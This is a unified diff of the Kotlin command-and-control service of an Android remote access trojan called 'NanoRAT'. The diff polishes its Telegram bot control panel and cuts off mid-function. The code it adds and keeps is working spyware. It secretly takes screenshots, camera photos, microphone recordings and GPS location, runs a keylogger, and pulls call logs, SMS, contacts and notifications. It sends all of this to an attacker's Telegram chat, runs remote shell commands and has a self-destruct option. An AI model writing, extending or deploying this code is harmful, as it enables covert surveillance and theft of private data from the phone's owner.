@@ -18,6 +18,9 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 import java.util.concurrent.TimeUnit
 
 class TelegramC2Service : Service() {
@@ -44,7 +47,12 @@ class TelegramC2Service : Service() {
     @Volatile private var projection: MediaProjection? = null
     @Volatile private var captureSession: ScreenCaptureSession? = null
     @Volatile private var lastUpdateId: Long = 0
-    @Volatile private var lastMenuMessageId: Long = 0
+
+    // UI state
+    @Volatile private var currentMenuPath: MutableList<String> = mutableListOf("main")
+    @Volatile private var currentMenuMessageId: Long = 0L
+    @Volatile private var startedAt: Long = System.currentTimeMillis()
+    @Volatile private var commandCount: Int = 0
 
     private fun log(msg: String) {
         android.util.Log.i(TAG, msg)
@@ -65,12 +73,15 @@ class TelegramC2Service : Service() {
             return
         }
 
+        startedAt = System.currentTimeMillis()
+
         scope.launch {
             registerBotCommands()
             delay(500)
             sendMainMenu()
         }
         scope.launch { pollLoop() }
+        scope.launch { autoRefreshLoop() }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -121,12 +132,14 @@ class TelegramC2Service : Service() {
                     captureSession?.release()
                     captureSession = null
                     projection = null
+                    scope.launch { refreshCurrentMenu() }
                 }
             }, Handler(Looper.getMainLooper()))
 
             projection = proj
             captureSession = ScreenCaptureSession(this, proj)
             log("projection ACTIVE with capture session")
+            scope.launch { refreshCurrentMenu() }
         } catch (e: Exception) {
             log("initProjection ERROR: ${e.message}")
             projection = null
@@ -160,34 +173,31 @@ class TelegramC2Service : Service() {
                 .build()
             try {
                 val raw = client.newCall(req).execute().use { r -> r.body?.string() }
-                if (raw == null) {
-                    log("api $method: null response")
-                    return@withContext null
-                }
-                if (!raw.trimStart().startsWith("{")) {
-                    log("api $method: non-JSON (${raw.take(80)}…)")
-                    return@withContext null
-                }
-                val obj = JSONObject(raw)
-                if (!obj.optBoolean("ok", false)) {
-                    log("api $method: !ok → ${obj.optString("description", "?")}")
-                }
-                obj
+                if (raw == null) return@withContext null
+                if (!raw.trimStart().startsWith("{")) return@withContext null
+                JSONObject(raw)
             } catch (e: Exception) {
-                log("api $method exception: ${e.message}")
+                log("api $method: ${e.message}")
                 null
             }
         }
+
+    private suspend fun sendChatAction(action: String) {
+        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+            .addFormDataPart("chat_id", CHAT_ID)
+            .addFormDataPart("action", action)
+            .build()
+        apiCall("sendChatAction", body)
+    }
 
     private suspend fun sendMessage(text: String) {
         val body = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("chat_id", CHAT_ID)
             .addFormDataPart("text", text.take(4000))
             .addFormDataPart("parse_mode", "HTML")
+            .addFormDataPart("disable_web_page_preview", "true")
             .build()
-        log("sendMessage len=${text.length}")
-        val r = apiCall("sendMessage", body)
-        log("sendMessage result ok=${r?.optBoolean("ok")}")
+        apiCall("sendMessage", body)
     }
 
     private suspend fun sendMessageWithKeyboard(text: String, keyboard: JSONObject): Long {
@@ -195,6 +205,7 @@ class TelegramC2Service : Service() {
             .addFormDataPart("chat_id", CHAT_ID)
             .addFormDataPart("text", text.take(4000))
             .addFormDataPart("parse_mode", "HTML")
+            .addFormDataPart("disable_web_page_preview", "true")
             .addFormDataPart("reply_markup", keyboard.toString())
             .build()
         val resp = apiCall("sendMessage", body)
@@ -209,6 +220,7 @@ class TelegramC2Service : Service() {
             .addFormDataPart("message_id", messageId.toString())
             .addFormDataPart("text", text.take(4000))
             .addFormDataPart("parse_mode", "HTML")
+            .addFormDataPart("disable_web_page_preview", "true")
             .addFormDataPart("reply_markup", keyboard.toString())
             .build()
         apiCall("editMessageText", body)
@@ -223,29 +235,24 @@ class TelegramC2Service : Service() {
     }
 
     private suspend fun sendDocument(filename: String, mime: String, bytes: ByteArray) {
-        log("sendDocument $filename (${bytes.size} bytes)")
         val fileBody = bytes.toRequestBody(mime.toMediaType())
         val body = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("chat_id", CHAT_ID)
             .addFormDataPart("document", filename, fileBody)
             .build()
-        val r = apiCall("sendDocument", body)
-        log("sendDocument result ok=${r?.optBoolean("ok")}")
+        apiCall("sendDocument", body)
     }
 
     private suspend fun sendPhoto(filename: String, jpegBytes: ByteArray, caption: String = "") {
-        log("sendPhoto $filename (${jpegBytes.size} bytes)")
         val fileBody = jpegBytes.toRequestBody("image/jpeg".toMediaType())
         val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("chat_id", CHAT_ID)
             .addFormDataPart("photo", filename, fileBody)
         if (caption.isNotEmpty()) builder.addFormDataPart("caption", caption.take(1000))
-        val r = apiCall("sendPhoto", builder.build())
-        log("sendPhoto result ok=${r?.optBoolean("ok")} desc=${r?.optString("description")}")
+        apiCall("sendPhoto", builder.build())
     }
 
     private suspend fun sendAudio(filename: String, bytes: ByteArray) {
-        log("sendAudio $filename (${bytes.size} bytes)")
         val fileBody = bytes.toRequestBody("audio/mp4".toMediaType())
         val body = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("chat_id", CHAT_ID)
@@ -258,7 +265,7 @@ class TelegramC2Service : Service() {
         val cmds = JSONArray().apply {
             put(JSONObject().put("command", "start").put("description", "🏠 Main menu"))
             put(JSONObject().put("command", "menu").put("description", "📋 Show menu"))
-            put(JSONObject().put("command", "help").put("description", "❓ Help"))
+            put(JSONObject().put("command", "status").put("description", "📊 Live status"))
             put(JSONObject().put("command", "info").put("description", "📱 Device info"))
             put(JSONObject().put("command", "shell").put("description", "💻 Run shell command"))
             put(JSONObject().put("command", "screenshot").put("description", "📸 Screen capture"))
@@ -269,10 +276,66 @@ class TelegramC2Service : Service() {
         apiCall("setMyCommands", body)
     }
 
+    // ---------- Live status ----------
+
+    private fun batteryPct(): Int {
+        return try {
+            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
+            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+        } catch (_: Exception) { 0 }
+    }
+
+    private fun batteryIcon(pct: Int): String = when {
+        pct >= 80 -> "🔋"
+        pct >= 40 -> "🔋"
+        pct >= 15 -> "🪫"
+        else      -> "🪫"
+    }
+
+    private fun uptimeStr(): String {
+        val s = (System.currentTimeMillis() - startedAt) / 1000
+        val h = s / 3600
+        val m = (s % 3600) / 60
+        return if (h > 0) "${h}h ${m}m" else "${m}m"
+    }
+
+    private fun notifCount(): Int {
+        return try { NotificationsBuffer.peek().length() } catch (_: Exception) { 0 }
+    }
+
+    private fun mainStatusLine(): String {
+        val bat = batteryPct()
+        val proj = if (captureSession != null) "🟢" else "🟡"
+        val notif = notifCount()
+        return "$proj capture   ${batteryIcon(bat)} $bat%   🔔 $notif   ⏱ ${uptimeStr()}"
+    }
+
+    private fun mainMenuText(): String {
+        val name = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
+        return buildString {
+            append("<b>🤖 NanoRAT — Control Center</b>\n")
+            append("━━━━━━━━━━━━━━━━━━━━━━\n")
+            append("📱 <code>$name</code>\n")
+            append("🆔 <code>${deviceId.take(8)}…</code>\n")
+            append("${mainStatusLine()}\n")
+            append("━━━━━━━━━━━━━━━━━━━━━━")
+        }
+    }
+
     // ---------- Menus ----------
 
-    private fun buildMainMenu(): JSONObject {
+    private fun mainKeyboard(): JSONObject {
+        val projReady = captureSession != null
+        val screenshotLabel = if (projReady) "📸 Screenshot" else "🚫 Screenshot"
+
         return JSONObject().put("inline_keyboard", JSONArray().apply {
+            // Row 1 — quick actions
+            put(JSONArray().apply {
+                put(JSONObject().put("text", screenshotLabel)
+                    .put("callback_data", if (projReady) "act:screenshot" else "act:no_projection"))
+                put(JSONObject().put("text", "📊 Status").put("callback_data", "menu:status"))
+            })
+            // Row 2 — main categories
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📸 Capture").put("callback_data", "menu:capture"))
                 put(JSONObject().put("text", "🎙 Record").put("callback_data", "menu:record"))
@@ -290,146 +353,222 @@ class TelegramC2Service : Service() {
                 put(JSONObject().put("text", "⚙️ System").put("callback_data", "menu:system"))
             })
             put(JSONArray().apply {
+                put(JSONObject().put("text", "🔄 Refresh").put("callback_data", "act:refresh"))
                 put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
             })
         })
     }
 
-    private fun buildCaptureMenu(): JSONObject =
-        JSONObject().put("inline_keyboard", JSONArray().apply {
-            put(JSONArray().apply {
-                put(JSONObject().put("text", "📸 Screenshot").put("callback_data", "act:screenshot"))
-                put(JSONObject().put("text", "🤳 Front").put("callback_data", "act:camera:front"))
-            })
-            put(JSONArray().apply {
-                put(JSONObject().put("text", "📷 Back").put("callback_data", "act:camera:back"))
-            })
-            put(JSONArray().apply {
-                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
-                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
-            })
-        })
+    private fun backRow(): JSONArray = JSONArray().apply {
+        put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:back"))
+        put(JSONObject().put("text", "🏠 Main").put("callback_data", "menu:main"))
+        put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
+    }
 
-    private fun buildRecordMenu(): JSONObject =
+    private fun captureMenuText(): String = buildString {
+        append("<b>📸 Capture</b>\n")
+        append("━━━━━━━━━━━━━━━━━━━━━━\n")
+        if (captureSession != null) {
+            append("🟢 Capture ready\n")
+            append("Screen projection is active.")
+        } else {
+            append("🔴 Capture disabled\n")
+            append("Open the app and grant screen capture permission.")
+        }
+    }
+
+    private fun captureMenuKeyboard(): JSONObject {
+        val ready = captureSession != null
+        return JSONObject().put("inline_keyboard", JSONArray().apply {
+            put(JSONArray().apply {
+                put(JSONObject().put("text", if (ready) "📸 Screenshot" else "🚫 Screenshot")
+                    .put("callback_data", if (ready) "act:screenshot" else "act:no_projection"))
+            })
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "🤳 Front camera").put("callback_data", "act:camera:front"))
+                put(JSONObject().put("text", "📷 Back camera").put("callback_data", "act:camera:back"))
+            })
+            put(backRow())
+        })
+    }
+
+    private fun recordMenuKeyboard(): JSONObject =
         JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "🎙 5s").put("callback_data", "act:mic:5"))
                 put(JSONObject().put("text", "🎙 10s").put("callback_data", "act:mic:10"))
                 put(JSONObject().put("text", "🎙 30s").put("callback_data", "act:mic:30"))
             })
-            put(JSONArray().apply {
-                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
-                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
-            })
+            put(backRow())
         })
 
-    private fun buildFilesMenu(): JSONObject =
+    private fun filesMenuKeyboard(): JSONObject =
         JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📂 /sdcard").put("callback_data", "act:ls:/sdcard"))
-                put(JSONObject().put("text", "📥 Download").put("callback_data", "prompt:get"))
-            })
-            put(JSONArray().apply {
                 put(JSONObject().put("text", "📂 Download").put("callback_data", "act:ls:/sdcard/Download"))
-                put(JSONObject().put("text", "📂 DCIM").put("callback_data", "act:ls:/sdcard/DCIM"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
-                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
+                put(JSONObject().put("text", "📂 DCIM").put("callback_data", "act:ls:/sdcard/DCIM"))
+                put(JSONObject().put("text", "📂 Pictures").put("callback_data", "act:ls:/sdcard/Pictures"))
             })
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "📥 Download file").put("callback_data", "prompt:get"))
+            })
+            put(backRow())
         })
 
-    private fun buildInfoMenu(): JSONObject =
-        JSONObject().put("inline_keyboard", JSONArray().apply {
+    private fun infoMenuKeyboard(): JSONObject {
+        val notif = notifCount()
+        return JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📱 Device").put("callback_data", "act:info"))
                 put(JSONObject().put("text", "🌐 Network").put("callback_data", "act:network"))
             })
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📍 Location").put("callback_data", "act:location"))
-                put(JSONObject().put("text", "📱 Apps").put("callback_data", "act:apps"))
+                put(JSONObject().put("text", "📦 Apps").put("callback_data", "act:apps"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
-                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
+                put(JSONObject().put("text", "🔔 Notifications ($notif)").put("callback_data", "act:notif"))
             })
+            put(backRow())
         })
+    }
 
-    private fun buildControlMenu(): JSONObject =
+    private fun controlMenuKeyboard(): JSONObject =
         JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "🔒 Lock").put("callback_data", "act:lock"))
                 put(JSONObject().put("text", "🏠 Home").put("callback_data", "act:home"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "◀️ Back").put("callback_data", "act:back"))
+                put(JSONObject().put("text", "◀️ Back key").put("callback_data", "act:back"))
                 put(JSONObject().put("text", "🪟 Recents").put("callback_data", "act:recents"))
             })
             put(JSONArray().apply {
                 put(JSONObject().put("text", "💻 Shell").put("callback_data", "prompt:shell"))
-                put(JSONObject().put("text", "🔗 URL").put("callback_data", "prompt:url"))
+                put(JSONObject().put("text", "🔗 Open URL").put("callback_data", "prompt:url"))
             })
-            put(JSONArray().apply {
-                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
-                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
-            })
+            put(backRow())
         })
 
-    private fun buildCommsMenu(): JSONObject =
+    private fun commsMenuKeyboard(): JSONObject =
         JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
-                put(JSONObject().put("text", "📞 Calls").put("callback_data", "act:calls"))
+                put(JSONObject().put("text", "📞 Call log").put("callback_data", "act:calls"))
                 put(JSONObject().put("text", "💬 SMS").put("callback_data", "act:sms"))
             })
             put(JSONArray().apply {
                 put(JSONObject().put("text", "👥 Contacts").put("callback_data", "act:contacts"))
                 put(JSONObject().put("text", "🔔 Notifications").put("callback_data", "act:notif"))
             })
-            put(JSONArray().apply {
-                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
-                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
-            })
+            put(backRow())
         })
 
-    private fun buildPrivacyMenu(): JSONObject =
-        JSONObject().put("inline_keyboard", JSONArray().apply {
+    private fun privacyMenuKeyboard(): JSONObject {
+        val kl = try { KeylogBuffer.isActive() } catch (_: Exception) { false }
+        val klState = if (kl) "🟢 recording" else "🔴 stopped"
+        return JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
-                put(JSONObject().put("text", "⌨️ Start").put("callback_data", "act:keylog_start"))
-                put(JSONObject().put("text", "⌨️ Dump").put("callback_data", "act:keylog_dump"))
+                put(JSONObject().put("text", "⌨️ $klState")
+                    .put("callback_data", "act:keylog_info"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "⌨️ Stop").put("callback_data", "act:keylog_stop"))
-                put(JSONObject().put("text", "🔔 Drain").put("callback_data", "act:notif"))
+                put(JSONObject().put("text", "▶️ Start").put("callback_data", "act:keylog_start"))
+                put(JSONObject().put("text", "⏹ Stop").put("callback_data", "act:keylog_stop"))
+                put(JSONObject().put("text", "📤 Dump").put("callback_data", "act:keylog_dump"))
             })
-            put(JSONArray().apply {
-                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
-                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
-            })
+            put(backRow())
         })
-
-    private fun buildSystemMenu(): JSONObject =
-        JSONObject().put("inline_keyboard", JSONArray().apply {
-            put(JSONArray().apply {
-                put(JSONObject().put("text", "🔄 Refresh").put("callback_data", "act:refresh"))
-                put(JSONObject().put("text", "🗑 Self destruct").put("callback_data", "prompt:selfdestruct"))
-            })
-            put(JSONArray().apply {
-                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
-                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
-            })
-        })
-
-    private fun mainMenuText(): String {
-        val projStatus = if (captureSession != null) "🟢 capture ready" else "🟡 capture disabled"
-        return "<b>NanoRAT — Control Center</b>\n\n" +
-               "📱 <code>${Build.MANUFACTURER} ${Build.MODEL}</code>\n" +
-               "🆔 <code>${deviceId.take(8)}…</code>\n" +
-               "🎬 $projStatus"
     }
 
+    private fun systemMenuKeyboard(): JSONObject =
+        JSONObject().put("inline_keyboard", JSONArray().apply {
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "🔄 Refresh menu").put("callback_data", "act:refresh"))
+                put(JSONObject().put("text", "📊 Live status").put("callback_data", "menu:status"))
+            })
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "🗑 Self destruct").put("callback_data", "prompt:selfdestruct"))
+            })
+            put(backRow())
+        })
+
+    private fun statusMenuText(): String {
+        val bat = batteryPct()
+        val proj = if (captureSession != null) "🟢 active" else "🟡 disabled"
+        val kl = try { if (KeylogBuffer.isActive()) "🟢 recording" else "🔴 stopped" } catch (_: Exception) { "?" }
+        val notif = notifCount()
+        val now = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
+        return buildString {
+            append("<b>📊 Live Status</b>\n")
+            append("━━━━━━━━━━━━━━━━━━━━━━\n")
+            append("🕐 <code>$now</code>\n")
+            append("${batteryIcon(bat)} Battery: <b>$bat%</b>\n")
+            append("📸 Projection: $proj\n")
+            append("⌨️ Keylogger: $kl\n")
+            append("🔔 Notifications: $notif\n")
+            append("⏱ Uptime: ${uptimeStr()}\n")
+            append("⚡ Commands: $commandCount\n")
+            append("━━━━━━━━━━━━━━━━━━━━━━")
+        }
+    }
+
+    private fun statusMenuKeyboard(): JSONObject =
+        JSONObject().put("inline_keyboard", JSONArray().apply {
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "🔄 Refresh").put("callback_data", "menu:status"))
+                put(JSONObject().put("text", "📊 Network").put("callback_data", "act:network"))
+            })
+            put(backRow())
+        })
+
     private suspend fun sendMainMenu() {
-        val id = sendMessageWithKeyboard(mainMenuText(), buildMainMenu())
-        if (id > 0) lastMenuMessageId = id
+        currentMenuPath = mutableListOf("main")
+        val id = sendMessageWithKeyboard(mainMenuText(), mainKeyboard())
+        if (id > 0) currentMenuMessageId = id
+    }
+
+    private suspend fun renderMenu(path: String, messageId: Long, edit: Boolean) {
+        val (text, kb) = when (path) {
+            "main"    -> mainMenuText() to mainKeyboard()
+            "capture" -> captureMenuText() to captureMenuKeyboard()
+            "record"  -> "<b>🎙 Record audio</b>\nSelect a duration:" to recordMenuKeyboard()
+            "files"   -> "<b>📁 Files</b>\nBrowse the device filesystem:" to filesMenuKeyboard()
+            "info"    -> "<b>📊 Info</b>\nDevice intelligence:" to infoMenuKeyboard()
+            "control" -> "<b>🎮 Control</b>\nDevice actions:" to controlMenuKeyboard()
+            "comms"   -> "<b>💬 Comms</b>\nCalls, SMS, contacts:" to commsMenuKeyboard()
+            "privacy" -> "<b>🔐 Privacy</b>\nKeylogger and notifications:" to privacyMenuKeyboard()
+            "system"  -> "<b>⚙️ System</b>\nMaintenance:" to systemMenuKeyboard()
+            "status"  -> statusMenuText() to statusMenuKeyboard()
+            else      -> mainMenuText() to mainKeyboard()
+        }
+        if (edit && messageId > 0) {
+            editMessageWithKeyboard(messageId, text, kb)
+        } else {
+            val id = sendMessageWithKeyboard(text, kb)
+            if (id > 0) currentMenuMessageId = id
+        }
+    }
+
+    private suspend fun refreshCurrentMenu() {
+        val path = currentMenuPath.lastOrNull() ?: "main"
+        if (currentMenuMessageId > 0) {
+            renderMenu(path, currentMenuMessageId, edit = true)
+        }
+    }
+
+    private suspend fun autoRefreshLoop() {
+        while (currentCoroutineContext().isActive) {
+            delay(60_000)
+            try {
+                val path = currentMenuPath.lastOrNull() ?: "main"
+                if (path == "main" || path == "status") {
+                    refreshCurrentMenu()
+                }
+            } catch (_: Exception) {}
+        }
     }
 
     // ---------- Long poll ----------
@@ -468,9 +607,10 @@ class TelegramC2Service : Service() {
             val text = msg.optString("text", "").trim()
             if (text.isEmpty()) return@let
             log("cmd: $text")
+            commandCount++
             try { dispatchTextCommand(text) } catch (e: Exception) {
-                log("dispatchTextCommand error: ${e.message}")
-                sendMessage("error: ${e.message}")
+                log("dispatch error: ${e.message}")
+                sendMessage("⚠️ error: ${e.message}")
             }
         }
 
@@ -481,9 +621,10 @@ class TelegramC2Service : Service() {
             val data = cb.optString("data", "")
             val msgId = cb.optJSONObject("message")?.optLong("message_id") ?: 0L
             log("callback: $data")
+            commandCount++
             try { handleCallback(cbId, msgId, data) } catch (e: Exception) {
                 log("handleCallback error: ${e.message}")
-                answerCallback(cbId, "error: ${e.message}")
+                answerCallback(cbId, "error")
             }
         }
     }
@@ -496,71 +637,80 @@ class TelegramC2Service : Service() {
             "menu" -> {
                 val which = parts.getOrNull(1) ?: "main"
                 answerCallback(callbackId)
-                if (which == "close") {
-                    val body = MultipartBody.Builder().setType(MultipartBody.FORM)
-                        .addFormDataPart("chat_id", CHAT_ID)
-                        .addFormDataPart("message_id", messageId.toString())
-                        .build()
-                    apiCall("deleteMessage", body)
-                    return
+                when (which) {
+                    "close" -> {
+                        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                            .addFormDataPart("chat_id", CHAT_ID)
+                            .addFormDataPart("message_id", messageId.toString())
+                            .build()
+                        apiCall("deleteMessage", body)
+                        return
+                    }
+                    "back" -> {
+                        // pop the last path
+                        if (currentMenuPath.size > 1) currentMenuPath.removeAt(currentMenuPath.size - 1)
+                        val prev = currentMenuPath.lastOrNull() ?: "main"
+                        currentMenuMessageId = messageId
+                        renderMenu(prev, messageId, edit = true)
+                        return
+                    }
+                    "main" -> {
+                        currentMenuPath = mutableListOf("main")
+                        currentMenuMessageId = messageId
+                        renderMenu("main", messageId, edit = true)
+                        return
+                    }
+                    else -> {
+                        // push the new path (replace last if same)
+                        val last = currentMenuPath.lastOrNull()
+                        if (last != which) currentMenuPath.add(which)
+                        currentMenuMessageId = messageId
+                        renderMenu(which, messageId, edit = true)
+                        return
+                    }
                 }
-                val (text, kb) = when (which) {
-                    "main"      -> mainMenuText() to buildMainMenu()
-                    "capture"   -> "<b>Capture</b>\nSelect an action:" to buildCaptureMenu()
-                    "record"    -> "<b>Record audio</b>\nSelect duration:" to buildRecordMenu()
-                    "files"     -> "<b>Files</b>\nBrowse or download:" to buildFilesMenu()
-                    "info"      -> "<b>Info</b>\nDevice intelligence:" to buildInfoMenu()
-                    "control"   -> "<b>Control</b>\nDevice actions:" to buildControlMenu()
-                    "comms"     -> "<b>Comms</b>\nContacts & messages:" to buildCommsMenu()
-                    "privacy"   -> "<b>Privacy</b>\nKeylogger & notifications:" to buildPrivacyMenu()
-                    "system"    -> "<b>System</b>\nMaintenance:" to buildSystemMenu()
-                    else        -> mainMenuText() to buildMainMenu()
-                }
-                editMessageWithKeyboard(messageId, text, kb)
             }
 
             "act" -> {
                 val action = parts.getOrNull(1) ?: return
                 val sub = parts.getOrNull(2) ?: ""
-                answerCallback(callbackId, "working...")
-                log("runAction begin: $action sub=$sub")
+                answerCallback(callbackId, "⏳ working…")
+                scope.launch { sendChatAction("upload_photo") }
                 runAction(action, sub)
-                log("runAction end: $action")
             }
 
             "prompt" -> {
                 val what = parts.getOrNull(1) ?: return
                 answerCallback(callbackId, "send /$what <value>")
-                sendMessage("Send <code>/$what &lt;value&gt;</code>")
+                sendMessage("Type: <code>/$what your_input</code>")
             }
         }
     }
 
     private suspend fun runAction(action: String, sub: String) {
-        log("runAction[$action] entered")
+        log("runAction[$action]")
         when (action) {
+            "no_projection" -> {
+                sendMessage("🚫 Screen capture not active.\n\nOpen the app → tap <b>4. Enable screen capture permission</b> → accept.")
+            }
+
             "screenshot" -> {
-                log("screenshot: session=${captureSession != null}")
                 val session = captureSession
-                if (session == null) { sendMessage("projection not active"); return }
+                if (session == null) { sendMessage("🚫 no projection session"); return }
                 val res = session.capture()
-                log("screenshot: capture done, error=${res.optString("error", "")}")
                 val b64 = res.optString("data_b64", "")
-                log("screenshot: b64 len=${b64.length}")
-                if (b64.isEmpty()) { sendMessage("capture failed: ${res.optString("error")}"); return }
-                val bytes = Base64.decode(b64, Base64.NO_WRAP)
-                log("screenshot: decoded bytes=${bytes.size}")
-                sendPhoto("screen_${System.currentTimeMillis()}.jpg", bytes, "📸 screenshot")
-                log("screenshot: sendPhoto completed")
+                if (b64.isEmpty()) { sendMessage("⚠️ capture failed: ${res.optString("error")}"); return }
+                sendPhoto("screen_${System.currentTimeMillis()}.jpg",
+                          Base64.decode(b64, Base64.NO_WRAP),
+                          "📸 <i>${SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())}</i>")
             }
 
             "camera" -> {
                 val cam = sub.ifEmpty { "back" }
-                log("camera: capturing $cam")
+                sendMessage("📷 taking $cam photo…")
                 val res = Camera.capture(this, cam)
                 val b64 = res.optString("data_b64", "")
-                log("camera: b64 len=${b64.length} error=${res.optString("error", "")}")
-                if (b64.isEmpty()) { sendMessage("camera error: ${res.optString("error")}"); return }
+                if (b64.isEmpty()) { sendMessage("⚠️ camera error: ${res.optString("error")}"); return }
                 sendPhoto("cam_${System.currentTimeMillis()}.jpg",
                           Base64.decode(b64, Base64.NO_WRAP),
                           "📷 $cam camera")
@@ -568,17 +718,60 @@ class TelegramC2Service : Service() {
 
             "mic" -> {
                 val sec = sub.toIntOrNull()?.coerceIn(1, 60) ?: 10
-                sendMessage("🎙 recording ${sec}s...")
+                sendMessage("🎙 recording ${sec}s…")
+                sendChatAction("record_voice")
                 val res = Audio.record(this, sec)
                 val b64 = res.optString("data_b64", "")
-                if (b64.isEmpty()) { sendMessage("mic error: ${res.optString("error")}"); return }
-                sendAudio("mic_${System.currentTimeMillis()}.m4a",
-                          Base64.decode(b64, Base64.NO_WRAP))
+                if (b64.isEmpty()) { sendMessage("⚠️ mic error: ${res.optString("error")}"); return }
+                sendAudio("mic_${System.currentTimeMillis()}.m4a", Base64.decode(b64, Base64.NO_WRAP))
             }
 
-            "info" -> sendMessage("<pre>${DeviceInfo.snapshot(this, deviceId).toString(2)}</pre>")
-            "network" -> sendMessage("<pre>${NetworkInfo.snapshot(this).toString(2).take(3500)}</pre>")
-            "location" -> sendMessage("<pre>${Location.get(this).toString(2)}</pre>")
+            "info" -> {
+                val s = DeviceInfo.snapshot(this, deviceId)
+                val bat = batteryPct()
+                val pretty = buildString {
+                    append("<b>📱 Device Info</b>\n")
+                    append("━━━━━━━━━━━━━━━━━━━━━━\n")
+                    append("🏷 Model: <b>${s.optString("model")}</b>\n")
+                    append("🏭 Maker: ${s.optString("manufacturer")}\n")
+                    append("🤖 Android: ${s.optString("android_version")} (SDK ${s.optInt("sdk_int")})\n")
+                    append("💻 Host: <code>${s.optString("hostname")}</code>\n")
+                    append("${batteryIcon(bat)} Battery: <b>$bat%</b>\n")
+                    append("🆔 ID: <code>${s.optString("device_id")}</code>")
+                }
+                sendMessage(pretty)
+            }
+
+            "network" -> {
+                val n = NetworkInfo.snapshot(this)
+                sendMessage("<pre>${n.toString(2).take(3500)}</pre>")
+            }
+
+            "location" -> {
+                sendChatAction("find_location")
+                val loc = Location.get(this)
+                if (loc.has("error")) {
+                    sendMessage("📍 ${loc.optString("error")}")
+                } else {
+                    val lat = loc.optDouble("lat")
+                    val lng = loc.optDouble("lng")
+                    sendMessage(buildString {
+                        append("<b>📍 Location</b>\n")
+                        append("━━━━━━━━━━━━━━━━━━━━━━\n")
+                        append("Lat: <code>$lat</code>\n")
+                        append("Lng: <code>$lng</code>\n")
+                        append("Accuracy: ${loc.optDouble("accuracy")}m\n")
+                        append("Provider: ${loc.optString("provider")}")
+                    })
+                    val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                        .addFormDataPart("chat_id", CHAT_ID)
+                        .addFormDataPart("latitude", lat.toString())
+                        .addFormDataPart("longitude", lng.toString())
+                        .build()
+                    apiCall("sendLocation", body)
+                }
+            }
+
             "apps" -> sendDocument("apps.json", "application/json",
                                     Apps.list(this, false).toString().toByteArray())
             "calls" -> sendDocument("calls.json", "application/json",
@@ -592,29 +785,45 @@ class TelegramC2Service : Service() {
                     .put("count", NotificationsBuffer.peek().length())
                     .put("items", NotificationsBuffer.drain())
                 sendDocument("notifications.json", "application/json", res.toString().toByteArray())
+                refreshCurrentMenu()
             }
             "lock" -> sendMessage("🔒 ${SystemControl.lockScreen(this)}")
             "home" -> sendMessage("🏠 ${SystemControl.goHome()}")
             "back" -> sendMessage("◀️ ${SystemControl.back()}")
             "recents" -> sendMessage("🪟 ${SystemControl.recents()}")
-            "keylog_start" -> { KeylogBuffer.start(); sendMessage("⌨️ keylogger started") }
-            "keylog_stop" -> { KeylogBuffer.stop(); sendMessage("⌨️ keylogger stopped") }
+
+            "keylog_start" -> {
+                KeylogBuffer.start()
+                sendMessage("⌨️ keylogger <b>started</b>")
+                refreshCurrentMenu()
+            }
+            "keylog_stop" -> {
+                KeylogBuffer.stop()
+                sendMessage("⌨️ keylogger <b>stopped</b>")
+                refreshCurrentMenu()
+            }
             "keylog_dump" -> {
                 val res = KeylogBuffer.dump()
-                sendMessage("<pre>${res.optString("output", "").take(3500).ifEmpty { "(empty)" }}</pre>")
+                val text = res.optString("output", "").ifEmpty { "(empty)" }
